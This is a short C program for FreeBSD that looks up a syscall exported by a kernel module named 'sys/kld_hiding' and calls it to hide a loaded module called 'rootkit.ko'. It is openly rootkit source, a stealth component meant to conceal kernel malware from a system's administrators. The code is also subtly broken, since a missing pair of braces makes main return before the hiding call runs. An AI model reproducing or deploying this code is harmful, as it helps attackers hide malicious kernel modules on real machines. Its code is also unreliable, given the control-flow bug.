#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/syscall.h>
#include <unistd.h>

static int
find_syscall(const char *module_name)
{
    struct module_stat module_stat;
    int module_id;

    module_id = modfind(module_name);
    if (module_id == -1) {
        perror("modfind");
        return -1;
    }

    memset(&module_stat, 0, sizeof(module_stat));
    
    module_stat.version = sizeof(module_stat);
    if (modstat(module_id, &module_stat) == -1) {
        perror("modstat");
        return -1;
    }

    return module_stat.data.intval;
}

int
main(void)
{
    int hide_module_syscall;

    hide_module_syscall = find_syscall("sys/kld_hiding");
    if (hide_module_syscall == -1)
        perror("find_syscall");
        return 1;

    if (syscall(hide_module_syscall, "rootkit.ko") == -1) {
        perror("hide rootkit.ko");
        return 1;
    }

    return 0;
}
